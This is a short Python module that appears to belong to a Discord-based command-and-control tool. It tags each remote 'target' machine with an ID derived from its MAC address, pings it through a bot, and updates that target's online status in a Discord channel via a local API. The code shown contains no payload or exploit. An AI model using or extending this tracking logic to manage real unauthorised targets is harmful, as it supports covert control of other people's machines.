import json
import uuid
import os
from dotenv import load_dotenv
import asyncio
import requests
from dotenv import load_dotenv, find_dotenv


load_dotenv(find_dotenv())


# generate uuid using the target's mac address
def generate_uuid():
    return str(uuid.getnode())


async def check_target_status(bot, ctx):
    message_check = 'pong!'
    DISCORD_TARGETS_CHANNEL_ID = os.environ.get("DISCORD_TARGETS_CHANNEL_ID")

    def check(message):
        return message.author.bot and message.content == message_check

    timeout_in_seconds = 5
    online = True

    try:
        await bot.wait_for('message', timeout=timeout_in_seconds, check=check)
    except asyncio.TimeoutError:
        online = False

    response = requests.get(f"http://localhost:8000/api/targetmessagebyuuid/{ctx.channel.name}")

    if response.text:
        message = json.loads(response.text)
        message_id = message['message_id']
        target_channel = None

        for channel in ctx.guild.channels:
            if str(channel.id) == DISCORD_TARGETS_CHANNEL_ID:
                target_channel = channel

        target_message = await target_channel.fetch_message(message_id)

        json_content = json.loads(target_message.content)
        json_content['online'] = online
        await target_message.edit(content = json.dumps(json_content))